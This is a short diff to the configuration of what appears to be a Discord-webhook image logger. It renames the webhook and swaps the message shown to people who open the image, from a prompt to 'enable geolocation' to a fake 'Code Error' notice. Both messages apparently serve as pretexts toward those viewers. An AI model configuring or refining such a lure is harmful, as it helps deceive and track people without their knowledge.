@@ -18,7 +18,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Captain Hook", # Set this to the name you want the webhook to have
+    "username": "CaptainHook", # Set this to the name you want the webhook to have
     "color": 0x009900FF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": 'Code Error In "enable geolocation to help prevent bots!"', # Message to show
+        "message": 'Code Error In "image.py"', # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
